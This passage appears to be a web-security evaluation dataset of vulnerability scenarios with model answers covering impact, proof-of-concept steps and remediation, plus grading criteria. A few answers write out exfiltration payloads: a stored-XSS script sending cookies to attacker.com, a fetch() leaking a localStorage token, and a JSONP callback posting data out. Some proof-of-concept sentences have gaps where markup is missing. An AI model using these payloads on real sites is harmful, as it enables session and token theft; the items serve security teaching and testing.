An attacker can discover admin API endpoints through JavaScript source code analysis, network traffic inspection, API documentation, or directory brute-forcing, then call these endpoints directly to perform administrative actions without the corresponding role. The real-world impact is complete privilege escalation, as any authenticated user can perform admin functions including user management, configuration changes, data export, and system-level operations by bypassing the cosmetic frontend restrictions. A proof-of-concept involves authenticating as a regular user, inspecting the application's JavaScript bundle or API documentation for admin endpoint paths, then making direct API calls to these endpoints using curl or Burp Suite and demonstrating successful execution of admin-level operations. Remediation requires implementing server-side authorization checks on every API endpoint that verify the caller's role before processing the request, using centralized authorization middleware, applying the principle of defense in depth where both UI and API enforce access controls independently, and adding comprehensive authorization test coverage for all endpoints.

scenario: A JWT contains sensitive data in plaintext payload.
expected_answer: This is an information disclosure vulnerability through JWT token inspection, as JWT payloads are merely base64url-encoded (not encrypted) and can be trivially decoded by anyone who obtains the token. Sensitive data such as user roles, email addresses, internal user IDs, subscription levels, account flags, or even password hashes stored in the JWT payload is fully readable by decoding the middle segment of the token. The real-world impact includes exposure of PII that violates privacy regulations, leaking internal authorization flags that reveal the application's access control model for exploitation, disclosing business logic details about user tiers and permissions, and providing reconnaissance data that accelerates other attack vectors. A proof-of-concept involves capturing the JWT from the Authorization header or cookie, splitting it at the period delimiters, base64url-decoding the payload segment (second part), and documenting all sensitive fields exposed in cleartext using tools like jwt.io or a simple base64 decoder. Remediation requires removing all sensitive data from JWT payloads and storing it server-side referenced by an opaque session identifier, using JWE (JSON Web Encryption) if sensitive claims must be included in the token, minimizing JWT payload to only essential claims (sub, iat, exp, iss), and implementing token introspection for any additional user data needs.
reasoning_requirement: Understand JWT is base64-encoded not encrypted.
evaluation_criteria: Mentions exposure of PII or internal claims.

scenario: File upload stores files in publicly accessible bucket with predictable names.
expected_answer: This is an unauthorized file access vulnerability through predictable URL enumeration, where files stored in publicly accessible cloud storage (S3, GCS, Azure Blob) with predictable naming patterns (sequential IDs, timestamps, or original filenames) can be discovered and downloaded by anyone. An attacker can enumerate file URLs by iterating through predictable patterns like https://bucket.s3.amazonaws.com/uploads/1001.pdf, https://bucket.s3.amazonaws.com/uploads/1002.pdf to access confidential documents uploaded by other users. The real-world impact includes exposure of sensitive documents like identification cards, medical records, financial statements, and private communications, potentially affecting thousands of users if the naming pattern covers the entire upload history. A proof-of-concept involves uploading a test file, noting the resulting URL pattern, then modifying the filename component to enumerate nearby values using Burp Intruder or a custom script, and documenting how many other users' files are accessible. Remediation requires generating cryptographically random filenames for all uploads, implementing per-object access control policies that require authentication, using pre-signed URLs with short expiration times for file access, blocking public listing on the storage bucket, and implementing server-side access validation that verifies the requesting user owns the file before generating a download URL.

scenario: A comment system stores input and renders without sanitization.
expected_answer: This is a Stored (Persistent) Cross-Site Scripting (XSS) vulnerability where malicious JavaScript payloads injected through the comment system are permanently saved in the database and executed in the browser of every user who views the affected page. Unlike reflected XSS, stored XSS does not require the victim to click a specially crafted link—simply viewing the page containing the malicious comment triggers the payload execution in their authenticated session context. The real-world impact is severe and scalable: a single malicious comment can compromise every user who views that page, enabling mass session hijacking, credential theft via fake login overlays, cryptojacking, defacement, and worm-like propagation where the payload creates additional malicious comments. A proof-of-concept involves submitting a comment containing <script>document.location='https://attacker.com/steal?c='+document.cookie</script>, viewing the page in another browser session, and demonstrating the script executes and sends the session cookie to the attacker's server. Remediation requires implementing server-side HTML sanitization using a proven library (DOMPurify, Bleach), applying context-aware output encoding when rendering user-generated content, deploying Content Security Policy headers without unsafe-inline, using a web application firewall as an additional layer, and implementing content moderation workflows for user-generated content.
evaluation_criteria: Mentions script execution on other users.

scenario: An endpoint allows account deletion via GET request.
expected_answer: This is a Cross-Site Request Forgery (CSRF) vulnerability amplified by the use of a GET request for a destructive state-changing operation, which violates HTTP method semantics and makes exploitation trivially easy. Since GET requests can be triggered by simply loading an image tag (), embedding a link, or including the URL in an email, an attacker can delete a victim's account without any user interaction beyond visiting a malicious page. The real-world impact is permanent account destruction and data loss for any authenticated user who visits a page controlled by the attacker or clicks a disguised link, with no confirmation or additional authentication required. A proof-of-concept involves creating a simple HTML page containing and hosting it on an attacker-controlled domain, then having an authenticated victim visit the page and verifying their account is deleted. Remediation requires using POST/DELETE methods for state-changing operations, implementing anti-CSRF tokens on all mutating endpoints, adding SameSite=Strict cookie attributes, requiring re-authentication for destructive operations like account deletion, and implementing a confirmation step with a unique token for irreversible actions.

scenario: A GraphQL API allows querying arbitrary nested fields.
expected_answer: This is an Excessive Data Exposure vulnerability combined with denial of service risk through deep nested queries in GraphQL, where the lack of query depth limits and field restrictions allows attackers to extract sensitive data and overwhelm server resources. An attacker can craft deeply nested queries that traverse relationships to access data they shouldn't see (e.g., querying user->organization->members->privateData) and create exponentially expanding queries that consume server memory and CPU. The real-world impact includes unauthorized access to sensitive data through relationship traversal, server resource exhaustion through malicious queries like {users{friends{friends{friends{...}}}}}, exposure of internal data model structure, and potential database overload from unoptimized deeply-nested resolver chains. A proof-of-concept involves sending progressively deeper nested queries to map accessible data relationships, documenting sensitive data reachable through traversal, and demonstrating server performance degradation with exponentially expanding query structures. Remediation requires implementing query depth limiting (typically 5-10 levels maximum), adding query complexity analysis and cost limits, implementing field-level authorization on all resolvers, using persistent queries or query whitelisting in production, setting execution timeouts, and implementing pagination requirements on all list-type fields.

scenario: A webhook sends sensitive data over HTTP.
expected_answer: This is a sensitive data exposure vulnerability through unencrypted transport, where webhook payloads containing sensitive information (API keys, user data, payment details, authentication tokens) are transmitted over plaintext HTTP and can be intercepted by any entity with network access along the path. Network-level attackers, compromised routers, ISPs, and man-in-the-middle positions can passively capture all webhook data including personally identifiable information, financial data, and authentication credentials. The real-world impact includes exposure of customer payment information violating PCI-DSS compliance, leakage of authentication tokens enabling account takeover, disclosure of business transaction data to competitors or malicious actors, and regulatory violations under GDPR and HIPAA for transmitting personal data without encryption. A proof-of-concept involves capturing network traffic on the webhook delivery path using tcpdump or Wireshark, filtering for HTTP traffic to the webhook endpoint, and demonstrating that sensitive payload content is visible in cleartext. Remediation requires enforcing HTTPS (TLS 1.2+) for all webhook delivery URLs, rejecting webhook registration with HTTP URLs, implementing webhook payload signing (HMAC) for integrity verification independent of transport, encrypting sensitive payload fields at the application layer, and implementing certificate pinning for webhook delivery to prevent TLS interception.

scenario: Application stores access tokens in localStorage.
prompt: What vulnerability chain should be evaluated?
expected_answer: This creates a token theft vulnerability chain where any Cross-Site Scripting (XSS) vulnerability in the application can be leveraged to steal access tokens stored in localStorage, since JavaScript has unrestricted read access to localStorage from the same origin. Unlike httpOnly cookies which are inaccessible to JavaScript, localStorage values can be trivially exfiltrated with a single line: fetch('https://attacker.com/steal?token='+localStorage.getItem('access_token')). The real-world impact is that any XSS vulnerability—reflected, stored, or DOM-based—becomes an immediate account takeover vector, as stolen access tokens can be used from any device or location to impersonate the victim without requiring their password or session. A proof-of-concept involves finding any XSS injection point in the application, injecting a payload that reads the token from localStorage and sends it to an attacker-controlled server, then using the stolen token to make authenticated API calls from a completely different browser or machine. Remediation requires migrating token storage to httpOnly, Secure, SameSite cookies that are inaccessible to JavaScript, implementing short-lived access tokens with refresh token rotation, using the Backend-for-Frontend (BFF) pattern where tokens are stored server-side, adding token binding to specific client fingerprints, and implementing robust XSS prevention as defense in depth.

scenario: An API endpoint supports JSONP.
expected_answer: This is a cross-site data leakage vulnerability through JSONP (JSON with Padding), where the endpoint wraps API responses in a callback function that can be loaded from any origin via a script tag, effectively bypassing the same-origin policy. An attacker can create a malicious webpage that includes a script tag pointing to the JSONP endpoint with a custom callback function, and when an authenticated victim visits the page, the browser sends cookies along with the request, returning the victim's data wrapped in the attacker's callback function. The real-world impact includes cross-origin theft of authenticated user data, session information, and any sensitive data returned by the JSONP endpoint, all without requiring any CORS misconfiguration since JSONP inherently bypasses same-origin restrictions. A proof-of-concept involves creating an HTML page with <script src='https://vulnerable-api.com/user/profile?callback=stealData'></script> and a JavaScript function stealData(data) { fetch('https://attacker.com/exfil', {method:'POST', body:JSON.stringify(data)}) }, then having an authenticated user visit the page. Remediation requires deprecating JSONP support in favor of properly configured CORS, implementing CSRF token validation on JSONP endpoints if they must remain active, restricting callback parameter values to a whitelist, and migrating all cross-origin data access to use standard CORS with strict origin validation.

scenario: A password change endpoint does not require current password.
expected_answer: This vulnerability enables account takeover when combined with any session compromise, as an attacker who gains temporary access to a user's session (through XSS, session fixation, shared computer, or session hijacking) can permanently lock out the legitimate user by changing their password without needing to know the current one. The missing reauthentication step means there is no verification that the person making the password change is actually the account owner, removing a critical safeguard against unauthorized session use. The real-world impact is that any temporary session compromise becomes a permanent account takeover, because the attacker can immediately change the password, locking out the legitimate user and gaining persistent access through new credentials they control. A proof-of-concept involves obtaining a valid session (simulating XSS cookie theft), navigating directly to the password change API endpoint, submitting a new password without providing the current password, and demonstrating successful password change and ability to log in with the new password from a different device. Remediation requires mandating current password verification for all password change operations, implementing step-up authentication (MFA challenge) for sensitive account changes, sending email notifications for password changes with a temporary reversal option, implementing session re-validation before critical account modifications, and adding a cooldown period between password changes.

scenario: An admin dashboard exposes CSV export of all users without role check.
expected_answer: This is a Broken Access Control vulnerability where the admin CSV export endpoint lacks role-based authorization, allowing any authenticated user to download a complete dump of all user data regardless of their privilege level. The missing authorization check means the endpoint only requires a valid session token but does not verify whether the authenticated user has administrative privileges to perform bulk data exports. The real-world impact is a catastrophic data breach exposing all user records including personally identifiable information (names, emails, addresses, phone numbers), potentially financial data, and account metadata, violating GDPR, CCPA, and other privacy regulations with significant legal and financial consequences. A proof-of-concept involves authenticating as a regular (non-admin) user, navigating directly to the CSV export endpoint URL (discovered through JavaScript source inspection, API documentation, or URL pattern guessing), and demonstrating successful download of the full user database export. Remediation requires implementing role-based authorization middleware that validates admin privileges before processing the export request, adding audit logging for all bulk data export operations, implementing export rate limiting and size restrictions, requiring MFA confirmation for data export operations, and conducting regular access control reviews on all administrative endpoints.

scenario: A system uses predictable session IDs.
expected_answer: This is a session prediction attack vulnerability where the use of predictable session identifiers (based on sequential numbers, timestamps, user IDs, or weak random number generators) allows an attacker to calculate or guess valid session IDs belonging to other users. By analyzing the pattern in their own session IDs over multiple authentication attempts, an attacker can derive the generation algorithm and predict valid session IDs for other concurrent users without needing their credentials. The real-world impact is direct session hijacking, where an attacker can impersonate any user by predicting and using their session ID in a cookie or header, gaining full access to accounts, data, and functionality without any authentication. A proof-of-concept involves collecting multiple session IDs, analyzing them for patterns (sequential incrementing, timestamp-based, or low-entropy randomness), using statistical analysis or reverse engineering to identify the generation algorithm, then predicting a valid session ID for another active user and using it to authenticate. Remediation requires using cryptographically secure pseudo-random number generators (CSPRNG) for session ID generation, ensuring session IDs have at least 128 bits of entropy, implementing session binding to client attributes (IP, User-Agent), adding session anomaly detection for concurrent usage, and regenerating session IDs after authentication and privilege changes.

scenario: An application fails to invalidate API keys after user removal.
expected_answer: This is an orphaned credential access vulnerability where API keys associated with removed or deactivated user accounts remain valid and functional, allowing continued unauthorized access to the application's API after the user should have lost all access. When employees are terminated, contractors' engagements end, or user accounts are suspended, their previously issued API keys continue to authenticate successfully, creating an invisible backdoor into the system. The real-world impact includes unauthorized data access by former employees or compromised accounts, persistent API abuse that cannot be traced to an active user, compliance violations for failing to enforce user lifecycle management, and potential data exfiltration or sabotage by disgruntled former users. A proof-of-concept involves creating a user account, generating an API key, deleting or deactivating the user account, then using the previously issued API key to make authenticated API calls and demonstrating it still grants access. Remediation requires implementing cascading credential revocation that automatically invalidates all API keys, tokens, and sessions when a user account is removed or deactivated, adding API key lifecycle management tied to user status, implementing regular API key audits that identify orphaned credentials, setting API key expiration policies, and creating automated processes that scan for and revoke credentials belonging to inactive accounts.

scenario: A password reset form accepts both email and user ID parameters.
expected_answer: This is an account takeover vulnerability through parameter tampering where the dual-parameter password reset flow creates an account binding mismatch between the email verification and the user ID that receives the password change. An attacker can submit their own email address (which they control and can verify) alongside a victim's user ID, potentially causing the password reset to be verified against the attacker's email but applied to the victim's account. The real-world impact is direct account takeover of any user whose user ID is known (often enumerable through sequential IDs or user profile pages), without requiring access to the victim's email inbox or any other authentication factor. A proof-of-concept involves intercepting the password reset request, replacing the user_id parameter with a target victim's ID while keeping the attacker's email, completing the reset verification through the link sent to the attacker's email, and verifying the password change was applied to the victim's account. Remediation requires using only a single identifier (email) in the reset flow and deriving the account server-side, removing the user ID parameter from the client-accessible reset request, binding reset tokens cryptographically to the specific account they were generated for, implementing server-side validation that both parameters reference the same account, and adding email notification to the account owner when a reset is initiated.

scenario: A file processing API decompresses ZIP files without size limits.
expected_answer: This is a Zip Bomb (decompression bomb) denial of service vulnerability where the API processes uploaded ZIP archives without validating the decompressed size, allowing an attacker to submit a small compressed file that expands to enormous sizes and exhausts server memory, disk space, or CPU resources. A classic zip bomb like 42.zip is only 42KB compressed but decompresses to 4.5 petabytes through nested compression layers, and even simpler variants with high compression ratios can expand a 1MB upload to multiple gigabytes. The real-world impact is service disruption through resource exhaustion, potentially crashing the application server, filling disk partitions, triggering out-of-memory conditions, and affecting other services on shared infrastructure. A proof-of-concept involves creating a zip file with high compression ratio (e.g., compressing a file filled with zeros, which compresses at ~1000:1 ratio), uploading it to the API, and monitoring server resource consumption as it attempts to decompress the file. Remediation requires implementing decompressed size limits by checking the declared uncompressed size in ZIP headers before extraction, streaming decompression with byte counting and abort thresholds, limiting the number of files and nesting depth within archives, running decompression in resource-constrained sandboxes (cgroups or containers with memory limits), and implementing timeout controls on decompression operations.

scenario: An API uses predictable order numbers in refunds endpoint.
expected_answer: This is an IDOR vulnerability in the refund processing endpoint where predictable sequential order numbers allow an attacker to enumerate and initiate refunds for other users' orders, causing direct financial loss. By iterating through order numbers in the refund API request, an attacker can trigger unauthorized refunds on orders belonging to other customers, potentially redirecting refund payments to their own account or disrupting the business's financial operations. The real-world impact includes direct financial theft through unauthorized refund initiation, disruption of business operations and customer relationships when legitimate orders are refunded, potential for large-scale financial fraud by scripting mass refund requests across all enumerable order numbers, and inventory management chaos from refunded orders. A proof-of-concept involves placing a legitimate order, noting the order number pattern, then modifying the order number in refund requests to target other users' orders, iterating through sequential IDs using Burp Intruder, and documenting successful refund initiations on orders not belonging to the attacker. Remediation requires implementing ownership verification that confirms the requesting user is the order owner before processing any refund, replacing sequential order numbers with non-enumerable UUIDs, adding financial transaction authorization requirements (e.g., manager approval for refunds above a threshold), implementing rate limiting on refund endpoints, and adding comprehensive audit logging for all refund operations.

scenario: Application exposes Swagger documentation publicly.
expected_answer: Publicly exposed Swagger/OpenAPI documentation dramatically expands the attack surface by providing a complete, detailed blueprint of all API endpoints, including hidden or undocumented ones, their parameter schemas, authentication mechanisms, and data models. An attacker can use this documentation to identify high-value targets such as admin endpoints, file upload handlers, financial operations, and user management APIs that would otherwise require extensive reconnaissance and fuzzing to discover. The real-world impact includes accelerated attack planning with full knowledge of the API's capabilities, discovery of deprecated but still-functional endpoints that may lack current security controls, understanding of exact parameter formats for crafting precision attacks, and identification of authentication bypass opportunities through endpoint-specific auth requirements. A proof-of-concept involves accessing the Swagger UI (commonly at /swagger, /api-docs, /docs, /swagger-ui.html), documenting all discovered endpoints with their authentication requirements, identifying endpoints that lack authentication, and using the 'Try It Out' feature to test API calls directly from the documentation interface. Remediation requires restricting access to API documentation behind authentication, removing Swagger UI from production deployments or limiting it to internal networks, implementing API gateway controls that enforce authentication regardless of documentation exposure, and regularly auditing published API documentation for sensitive endpoint disclosure.

scenario: A session cookie lacks SameSite attribute.
expected_answer: This creates a Cross-Site Request Forgery (CSRF) vulnerability because without the SameSite cookie attribute, the browser will automatically include the session cookie in cross-origin requests initiated from attacker-controlled websites, allowing unauthorized state-changing actions on behalf of the authenticated user. When SameSite is not set, the browser defaults to SameSite=Lax in modern browsers (which protects POST requests but not GET-based state changes) or SameSite=None in older browsers (which provides no protection at all). The real-world impact includes unauthorized actions performed on the victim's behalf such as password changes, fund transfers, email modifications, and data deletion when the victim visits a malicious website while authenticated to the vulnerable application. A proof-of-concept involves creating an HTML page with a hidden form that auto-submits a state-changing POST request to the vulnerable application, hosting it on a separate domain, and demonstrating that the action executes successfully when visited by an authenticated victim due to the session cookie being included in the cross-origin request. Remediation requires setting the SameSite attribute to Strict or Lax on all session cookies, implementing anti-CSRF tokens as an additional layer of defense, ensuring all state-changing operations use POST/PUT/DELETE methods, adding the Secure flag to prevent cookie transmission over HTTP, and implementing custom request headers that are not sent in simple cross-origin requests.

scenario: A multi-step checkout flow validates stock only at first step.
expected_answer: This is a business logic race condition vulnerability where stock validation occurs only at the initial step of the checkout flow, creating a Time-of-Check to Time-of-Use (TOCTOU) gap that allows concurrent purchases to exceed available inventory. Multiple buyers can pass the stock check simultaneously at step one, then proceed through the remaining checkout steps and complete purchases even after inventory has been depleted by other concurrent transactions. The real-world impact includes overselling of limited inventory, financial losses from fulfilling orders that cannot be shipped, customer dissatisfaction from order cancellations, and potential exploitation of limited-edition or discounted items by bots that intentionally race through checkout. A proof-of-concept involves identifying a product with limited stock (e.g., 1 remaining), opening multiple browser sessions or using automated tools to simultaneously reach step one of checkout, then completing all checkout flows and demonstrating that more units were sold than were available in inventory. Remediation requires implementing stock validation at every step of the checkout flow, using database-level inventory locks during the checkout process, reserving inventory with time-limited holds when users enter checkout, implementing optimistic concurrency control with version checks on final purchase, and adding post-transaction reconciliation that detects and handles oversell situations.

scenario: An API endpoint accepts serialized objects from clients.
expected_answer: This is an Insecure Deserialization vulnerability (OWASP A08) where the API deserializes untrusted client-supplied objects, potentially allowing an attacker to execute arbitrary code, manipulate application logic, or escalate privileges by crafting malicious serialized payloads. When applications deserialize objects from formats like Java ObjectInputStream, Python pickle, PHP unserialize, or .NET BinaryFormatter, an attacker can include gadget chains—sequences of existing class methods that chain together during deserialization to achieve code execution. The real-world impact is often remote code execution (RCE) with the privileges of the application process, enabling complete server compromise, data exfiltration, lateral movement, and persistent backdoor installation, as demonstrated in numerous high-profile breaches. A proof-of-concept involves identifying the serialization format from Content-Type headers or request body patterns, using tools like ysoserial (Java), pickle exploitation scripts (Python), or phpggc (PHP) to generate payloads with known gadget chains, and submitting them to observe server-side code execution or DNS callbacks. Remediation requires avoiding deserialization of untrusted data entirely, using safe data interchange formats like JSON, implementing integrity checks (digital signatures) on serialized data if deserialization is necessary, restricting deserialization to a whitelist of allowed classes, running deserialization in isolated sandboxes with minimal privileges, and keeping all framework dependencies updated to patch known gadget chains.

scenario: Password reset link does not bind to specific IP or device.
expected_answer: This vulnerability allows password reset token reuse from any device or network location, meaning an intercepted or leaked reset link can be used by an attacker from anywhere in the world without any device or location binding validation. The lack of contextual validation means that tokens captured through email interception, referrer leakage, log exposure, or shoulder surfing can be immediately used from the attacker's own device and network. The real-world impact is account takeover that persists even in environments where the user's device is secure, as the token's validity is completely independent of the request context, making any token interception vector directly exploitable regardless of geographic or device separation. A proof-of-concept involves triggering a password reset, capturing the reset link, then opening the link from a completely different device, network, and geographic location (e.g., using a VPN from another country), and demonstrating that the password change completes successfully without any additional verification. Remediation requires binding reset tokens to the originating session or IP address range, implementing device fingerprinting that validates the reset is completed from a similar context, sending secondary verification (SMS code or push notification) when the reset is attempted from an unrecognized device or location, reducing token validity windows, and implementing anomaly detection for cross-device token usage patterns.

scenario: Application relies solely on JavaScript validation for payment limits.
expected_answer: This is a business logic bypass vulnerability where payment limits enforced only through client-side JavaScript validation can be trivially circumvented by disabling JavaScript, modifying requests with a proxy, or using direct API calls that bypass the browser entirely. Since JavaScript runs in the user's browser under their full control, any validation, limit checking, or business rule enforcement performed solely in JavaScript provides zero security guarantees against a determined attacker. The real-world impact includes processing payments below minimum thresholds, exceeding maximum payment limits, manipulating pricing calculations, bypassing fraud detection rules, and creating transactions outside the intended business parameters, all resulting in direct financial loss. A proof-of-concept involves intercepting the payment request in Burp Suite after the client-side validation passes, modifying the amount field to exceed the JavaScript-enforced limit (or reducing it below the minimum), forwarding the modified request, and verifying the server processes the transaction at the tampered value. Remediation requires implementing all payment validation, limit enforcement, and business rule checks on the server side, treating client-side validation purely as a user experience enhancement, using server-side calculated totals based on item IDs and quantities from the authoritative product catalog, implementing transaction monitoring for anomalous patterns, and adding reconciliation checks that compare submitted amounts against expected values.

scenario: A public S3 bucket allows listing but not download.
expected_answer: This is an information disclosure vulnerability through object name enumeration where publicly accessible S3 bucket listing exposes filenames, directory structures, file sizes, and last-modified timestamps even when individual file downloads are restricted. Filenames themselves often contain sensitive information such as customer names, project codes, internal identifiers, date ranges revealing business activity patterns, and descriptive naming that reveals the nature of stored documents. The real-world impact includes competitive intelligence from understanding stored document types and volumes, identification of backup files or configuration exports that may contain credentials, discovery of filename patterns that could be used for social engineering or targeted attacks, and potential identification of files that may be accessible through alternative methods. A proof-of-concept involves accessing the S3 bucket listing endpoint (https://bucket-name.s3.amazonaws.com/?list-type=2 or using aws s3 ls), documenting the exposed filenames and their metadata, and analyzing the filenames for sensitive information patterns like 'customer_exports_2026-01.csv' or 'db_backup_production.sql.gz'. Remediation requires disabling public bucket listing through the S3 bucket policy, enabling S3 Block Public Access settings at the account level, implementing bucket policies that explicitly deny ListBucket for unauthorized principals, auditing all S3 buckets for public access configurations, and implementing AWS CloudTrail monitoring for unauthorized S3 access attempts.

scenario: An API allows changing email without verifying ownership.
expected_answer: This is an account takeover vulnerability through unverified email change, where the application allows users to update their email address without confirming ownership of the new email, enabling an attacker to redirect password resets, notifications, and account recovery to an email they control. Once the email is changed, the attacker can trigger a password reset to the new email address, complete the reset, and gain permanent control of the account with credentials they control. The real-world impact is complete and permanent account takeover, as the attacker replaces the victim's email with their own, resets the password, and locks the legitimate owner out of all recovery mechanisms since both the password and email are now under attacker control. A proof-of-concept involves authenticating as a user (or exploiting a session compromise), changing the account email to an attacker-controlled address via the API without any verification challenge, then triggering a password reset to the new email and demonstrating complete account takeover. Remediation requires implementing email verification for all email changes by sending a confirmation link to the new email address before applying the change, requiring current password or MFA confirmation before allowing email changes, sending a notification to the old email address about the change with a reversion option, implementing a cooling-off period before email changes take effect, and maintaining audit logs of all email modifications.

scenario: OAuth flow does not validate state parameter.
expected_answer: This is a CSRF vulnerability in the OAuth authentication flow where the missing state parameter validation allows an attacker to force a victim to authenticate with the attacker's OAuth account, linking it to the victim's session. Without state parameter validation, an attacker can initiate an OAuth flow, capture the authorization callback URL containing their authorization code, and trick the victim into visiting this URL, causing the victim's account to be linked to the attacker's OAuth identity. The real-world impact includes account linking attacks where the attacker gains persistent access to the victim's account through their own OAuth credentials, session fixation where the victim unknowingly operates under the attacker's identity, and login CSRF where the victim's actions (purchases, data entry) are performed in the attacker's account context. A proof-of-concept involves initiating the OAuth flow, pausing at the callback step to capture the authorization code URL, crafting a page that redirects the victim to this callback URL (e.g., ), and demonstrating that the victim's session becomes linked to the attacker's OAuth account. Remediation requires generating a cryptographically random state parameter bound to the user's session, validating the state parameter on every OAuth callback by comparing it against the session-stored value, implementing PKCE (Proof Key for Code Exchange) for additional protection, and rejecting any OAuth callback that lacks or has a mismatched state value.

scenario: Admin password reset does not require MFA confirmation.
expected_answer: This is a privilege escalation vulnerability bypassing multi-factor authentication, where an attacker who compromises an admin's session or password can reset the password without being challenged by the MFA second factor, effectively bypassing the additional security layer entirely. The gap in MFA enforcement on the password reset flow means that MFA only protects the login step but not the most critical account modification, creating an inconsistent security boundary. The real-world impact is complete administrative account takeover with full system control, even when MFA is enabled, since the attacker can change the admin password and set up their own MFA on the account, permanently locking out the legitimate administrator. A proof-of-concept involves obtaining temporary admin session access (through XSS, session hijacking, or phishing), navigating to the password reset functionality, completing the password change without encountering any MFA challenge, and demonstrating that the admin's MFA is effectively bypassed for this critical operation. Remediation requires implementing step-up authentication that challenges for MFA on all sensitive operations (password changes, email changes, role modifications, API key generation), applying MFA consistently across all critical account management functions, implementing separate MFA validation for high-privilege operations even within an authenticated session, sending immediate notifications of password changes to alternative admin contacts, and requiring multiple administrator approval for admin password resets.

scenario: Application stores password hashes using unsalted MD5.
expected_answer: This creates a rapid offline password cracking vulnerability where unsalted MD5 hashes can be reversed using precomputed rainbow tables in seconds and brute-forced at rates exceeding 10 billion hashes per second on modern GPUs. Without salting, identical passwords produce identical hashes, allowing attackers to crack all instances simultaneously and leverage precomputed lookup tables covering common passwords and dictionary words. The real-world impact is that any database breach immediately compromises the majority of user passwords, as MD5 provides essentially no protection against modern cracking hardware, and the lack of salting means the entire password database can be processed as a batch using rainbow tables. A proof-of-concept involves demonstrating that the stored hash matches known MD5 outputs for common passwords (e.g., MD5 of 'password123' is '482c811da5d5b4bc6d497ffa98491e38'), using online MD5 lookup databases to reverse hashes instantly, and benchmarking hashcat to show that the full keyspace of 8-character passwords can be exhausted in hours. Remediation requires immediately migrating to a modern adaptive hashing algorithm like bcrypt, scrypt, or Argon2id with appropriate cost factors, implementing unique per-user salts of at least 128 bits, forcing a password reset for all users during migration, implementing the new hashing transparently by rehashing on next login, and establishing regular reviews of password storage security against current best practices.

scenario: API accepts user-supplied URL to fetch profile picture.
expected_answer: This is a Server-Side Request Forgery (SSRF) vulnerability where the application makes HTTP requests to user-supplied URLs from the server side, allowing an attacker to probe internal network resources, access cloud metadata services, and interact with internal services that are not exposed to the internet. By supplying URLs pointing to internal addresses (http://127.0.0.1, http://169.254.169.254, http://internal-service:8080), the attacker forces the server to make requests to these targets with the server's network privileges and credentials. The real-world impact includes theft of cloud IAM credentials from metadata services, port scanning and service discovery of internal infrastructure, accessing internal admin panels and databases, reading local files through file:// protocol handlers, and potentially achieving remote code execution through internal service exploitation. A proof-of-concept involves submitting a profile picture URL pointing to http://169.254.169.254/latest/meta-data/ (AWS metadata) or an attacker-controlled server with a listener, observing the server's request in the callback or the returned content for internal data leakage. Remediation requires implementing strict URL validation with a whitelist of allowed domains, blocking all private IP ranges (RFC 1918) and link-local addresses, disabling unnecessary protocol handlers (file://, gopher://, dict://), using a dedicated egress proxy with restricted network access for URL fetching, and implementing DNS resolution validation to prevent DNS rebinding attacks.

scenario: A login endpoint returns distinct timing differences for valid users.
expected_answer: This is a timing-based user enumeration vulnerability (side-channel attack) where measurable response time differences between valid and invalid usernames allow an attacker to determine which accounts exist in the system. The timing discrepancy typically occurs because the server performs expensive operations (password hashing, database lookups) only for valid usernames, creating a measurable delay compared to the fast rejection of non-existent usernames. The real-world impact includes building a verified list of valid user accounts for targeted credential stuffing, phishing campaigns, and social engineering attacks, with the added stealth advantage that timing-based enumeration is harder to detect than response-message-based enumeration. A proof-of-concept involves sending authentication requests with known-valid and known-invalid usernames, measuring response times over multiple iterations to establish statistical significance, and demonstrating a consistent timing difference (often 50-200ms) that reliably distinguishes valid from invalid accounts using tools like Burp Suite's response time analysis. Remediation requires implementing constant-time comparison functions for authentication, performing the same computational work (including password hashing) for both valid and invalid usernames, adding random jitter to response times, using generic error messages that do not distinguish between username and password failures, and implementing rate limiting on authentication endpoints to make timing analysis impractical at scale.

scenario: Application allows unlimited file size uploads.
expected_answer: This is a denial of service vulnerability through resource exhaustion where the absence of file size limits on uploads allows an attacker to consume all available disk space, memory, or bandwidth, rendering the application or its entire hosting environment unavailable. An attacker can upload extremely large files (gigabytes) repeatedly to fill server disk partitions, exhaust upload processing memory buffers, saturate network bandwidth, and potentially affect other applications sharing the same infrastructure. The real-world impact includes complete service outage when disk space is exhausted, application crashes from out-of-memory conditions during large file processing, degraded performance for all users during bandwidth-saturating uploads, and potential cascading failures affecting databases and logging when disk space runs out. A proof-of-concept involves using curl or a custom script to upload progressively larger files (100MB, 1GB, 10GB) to the endpoint, monitoring server resource utilization (disk space, memory, CPU), and documenting the point at which the upload causes service degradation or failure. Remediation requires implementing maximum file size limits at multiple layers (web server, application, and reverse proxy), using streaming upload processing that does not buffer entire files in memory, implementing per-user upload quotas and rate limits, adding disk space monitoring with alerts, implementing automatic cleanup of temporary upload files, and configuring web server timeouts that abort excessively long uploads.
reasoning_requirement: Recognize storage or memory abuse risk.

scenario: JWT secret is guessable due to short key length.
expected_answer: This is a JWT signature brute force vulnerability where a weak or short symmetric signing key (used with HS256/HS384/HS512) can be cracked offline, allowing an attacker to forge arbitrary JWT tokens with any claims they desire. Using tools like hashcat or jwt-cracker, an attacker can brute-force or dictionary-attack the JWT secret key against a captured token, and once the key is discovered, forge tokens with admin privileges, modified user IDs, or extended expiration times. The real-world impact is complete authentication bypass, as knowledge of the signing secret allows creating valid JWTs for any user, any role, and any expiration, effectively granting unlimited access to the entire application without any credentials. A proof-of-concept involves capturing a valid JWT, using hashcat with mode 16500 (JWT) or jwt-cracker to attempt common passwords and short key values against the token, and upon discovering the secret, forging a new token with admin claims using PyJWT or jwt.io and demonstrating successful authenticated access. Remediation requires using cryptographically random secrets of at least 256 bits for HMAC-based JWT algorithms, migrating to asymmetric algorithms (RS256/ES256) where the private key is never exposed, implementing key rotation policies, storing JWT secrets in secure key management systems (HashiCorp Vault, AWS KMS), and monitoring for anomalous JWT usage patterns that might indicate key compromise.

scenario: API endpoint allows deletion of any resource by ID without ownership check.
expected_answer: This is an IDOR vulnerability leading to destructive unauthorized actions where any authenticated user can delete resources belonging to other users by simply specifying different resource IDs in the delete request without ownership verification. The missing authorization check means the API only validates that the user is authenticated but does not verify they own or have permission to delete the targeted resource. The real-world impact includes mass data destruction across the platform, targeted deletion of competitors' content or listings, sabotage of business-critical records, and potential regulatory violations from unauthorized destruction of data subject to retention requirements. A proof-of-concept involves creating a test resource, noting its ID, then authenticating as a different user and sending a DELETE request for the first user's resource ID, verifying the deletion succeeds and the resource is removed from the original owner's account. Remediation requires implementing object-level authorization checks that verify the authenticated user owns or has explicit delete permission on the target resource before processing, using access control policies that enforce ownership validation at the data layer, adding soft-delete mechanisms with admin recovery capabilities, implementing audit logging for all delete operations, and adding confirmation requirements for bulk or sensitive deletion operations.

scenario: An app uses predictable temporary file names during export.
